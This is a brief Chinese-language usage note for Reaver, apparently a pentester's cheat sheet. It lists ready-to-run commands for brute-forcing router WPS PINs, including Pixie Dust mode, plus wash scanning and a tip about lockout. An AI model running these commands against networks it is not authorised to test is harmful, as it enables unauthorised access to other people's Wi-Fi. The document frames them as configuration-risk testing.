# Reaver 使用

Reaver 用于 WPS PIN 测试，适合验证路由器 WPS 配置风险。

## 常用命令

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
```

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1
```

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 15
```

```bash
sudo wash -i wlan0mon
```

小记录：WPS 测试会触发锁定机制，先用 wash 观察状态再决定是否继续。
